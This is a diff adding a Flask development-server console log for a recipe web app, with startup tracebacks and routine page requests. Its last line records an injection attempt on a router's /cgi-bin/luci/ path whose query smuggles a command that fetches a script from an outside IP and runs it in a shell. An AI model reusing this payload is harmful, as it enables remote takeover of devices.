@@ -1,1 +1,96 @@
 python3: can't open file '/var/www/3rd_milestone/app.py': [Errno 2] No such file or directory
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/app.py", line 6, in <module>
+    from server import app, models, routes
+  File "/var/www/3rd_milestone/server/__init__.py", line 3, in <module>
+    from flask_sqlalchemy import SQLAlchemy
+ModuleNotFoundError: No module named 'flask_sqlalchemy'
+Traceback (most recent call last):
+  File "/var/www/3rd_milestone/app.py", line 6, in <module>
+    from server import app, models, routes
+  File "/var/www/3rd_milestone/server/__init__.py", line 3, in <module>
+    from flask_sqlalchemy import SQLAlchemy
+ModuleNotFoundError: No module named 'flask_sqlalchemy'
+ * Serving Flask app 'server'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.236.1.60:5000
+[33mPress CTRL+C to quit[0m
+172.236.1.60 - - [08/Oct/2024 00:42:46] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:42:48] "[33mGET /ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:42:50] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:42:50] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:42:55] "[33mGET /recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:43:06] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:06] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:07] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:07] "[36mGET /static/assets/starters.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:43:07] "GET /static/css/styles.css HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:07] "[36mGET /static/assets/mains.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:43:07] "[36mGET /static/assets/desserts.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:43:07] "GET /static/js/jquery-3.7.1.min.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:07] "GET /static/js/scripts.js HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:08] "[36mGET /static/assets/cookbook.png HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:43:09] "POST /all_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:10] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:12] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:12] "GET / HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:13] "GET /about HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:15] "[33mGET /about/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:43:16] "GET /sign_in HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:19] "[32mPOST /login HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 00:43:19] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:20] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:43:21] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:21] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:23] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:24] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:25] "POST /edit_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:26] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:29] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:43:34] "POST /view_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:37] "[33mGET /view_recipe/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:43:37] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:39] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:43:40] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:41] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:41] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:43] "GET /new_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:48] "[33mGET /new_recipe/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:43:58] "[32mPOST /adding_new_recipe HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 00:43:58] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:43:58] "[36mGET /static/assets/kids.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:43:58] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:08] "[32mPOST /delete_recipe HTTP/1.1[0m" 302 -
+172.236.1.60 - - [08/Oct/2024 00:44:08] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:08] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:18] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:18] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:18] "GET /my_profile HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:18] "GET /my_profile HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:19] "[33mGET /my_profile/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:26] "GET /recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:26] "[33mGET /recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:27] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:27] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:27] "[36mGET /static/assets/head_pic.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:44:27] "[36mGET /static/assets/recipes.jpg HTTP/1.1[0m" 304 -
+172.236.1.60 - - [08/Oct/2024 00:44:28] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:29] "GET /events HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:29] "[33mGET /events/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:30] "GET /home HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:31] "[33mGET /home/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:32] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:33] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:34] "GET /new_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:34] "GET /new_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:34] "[33mGET /new_recipe/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:43] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:43] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:44] "POST /edit_recipe HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:45] "[33mGET /edit_recipe/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:44:50] "GET /my_recipes HTTP/1.1" 200 -
+172.236.1.60 - - [08/Oct/2024 00:44:50] "[33mGET /my_recipes/ws HTTP/1.1[0m" 404 -
+172.236.1.60 - - [08/Oct/2024 00:45:07] "[33mGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+-O-+http://154.216.17.31/t|sh;`) HTTP/1.1[0m" 404 -
